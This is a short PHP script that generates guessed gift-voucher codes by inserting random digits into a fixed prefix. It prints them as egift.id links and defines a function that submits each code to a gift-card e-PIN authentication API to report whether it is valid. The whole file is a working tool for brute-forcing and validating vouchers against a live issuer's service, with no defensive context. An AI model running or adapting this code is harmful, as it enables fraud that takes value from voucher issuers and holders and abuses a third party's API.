<?php

$dep =  "DU8A08I351";
$bel = "00";
for ( $i = 0 ; $i < 9 ; $i++){
    echo "http://egift.id/" .$dep . rand(0,9) . $bel . rand(0,9) .  "<br>";
}
function check($code){ $getContents = file_get_contents("http://sepin.giftn.co.id/api/EPin/AuthEPin?cid=GFN0268&wid=kfc&epin=".$code); 
    $jDecode = json_decode($getContents); 
    if ($jDecode->errorcode == "001"){ echo $code." => VALID"; 
    }else{ echo $code." => INVALID"; 
    }
 }


?>